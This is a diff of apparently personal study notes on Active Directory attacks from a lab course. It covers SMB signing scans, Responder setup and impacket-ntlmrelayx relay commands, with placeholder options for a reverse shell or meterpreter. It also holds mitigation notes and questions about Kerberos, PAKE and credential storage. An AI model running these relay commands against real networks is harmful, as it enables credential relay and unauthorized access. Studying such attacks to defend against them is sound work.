@@ -27,14 +27,25 @@ nmap --script=smb2-security-mode.nse -p445 192.168.0.0/24 -oN scan_TCM_AD_SMB_si
 To perform attack edit:
 nano /etc/responder/Responder.conf
 # set smb and http to Off
-impacket-ntlmrelayx -tf targets.txt -smb2support
+impacket-ntlmrelayx -tf targets.txt -smb2support --no-multirelay
 # targets should have  =IP to relay to, aka victim
 SMB relay only relays SMB service and therefore when successful gives an SMB service connection
+# there is a conflict with ports, run ntlmrelayx first then run responder, because responder doesn't crash if port is in use
+# note when device doesn't have network and file sharing enabled, relay is impossible.
+impacket-ntlmrelayx -tf targets.txt -smb2support --no-multirelay -i 
+#the -i option connects to target smb through cli and makes local port listen
+# how does file sharing worjk and why do I have access to C$ share which isbasically entire partition???
+-c <command> #ex -c "powershell reverse shell"
+-e <meterpreter listener???>
 
+#Mitigation: smb signing enable, ntlm disable, 
+# **account tiering, local admin restriction
+ 
 # How does file sharing work and how far does it go in file system?
 
 NTLM relay
 
+LDAP binding?
 
 # Questions
 what if network discovery is off?
@@ -46,3 +57,55 @@ Network discovery relies on higher level protocols for visibility in file explor
 File share allows certain ports open and connect
 
 GPO to enable or how do most orgs handle?
+
+###
+
+What proof does the client send?
+
+How does the authenticator verify?
+
+Where is the credential stored?
+
+What is the lifecycle of the credential?
+
+What is the minimum credential needed?
+
+Is there mutual authentication?
+
+Why was this design chosen?
+
+What makes each attempt unique?
+
+If intercepted, what could an attacker do?
+
+####
+a Client can't tamper with ticket
+b can't view ticket
+c service trust ticket
+
+TGT is like sealed envelope
+
+####
+
+store only verifier
+
+too complex???
+
+PAKE (Password-Authenticated Key Exchange) protocols like SRP and OPAQUE
+
+#
+*** stateful vs stateless sessions
+
+
+####
+
+The naive solution: Each service stores your password hash and authenticates you directly. This is what MySQL does. But it doesn't scale:
+
+Every service must store every user's credentials (or delegate to a central database, which is just moving the problem).
+
+Every service must be trusted with your credentials.
+
+A compromise of any service compromises all credentials.
+
+Kerberos's solution: A trusted third party (the KDC) authenticates you once and issues tickets that prove your identity to any service. The services trust the KDC, so they trust the tickets.
+
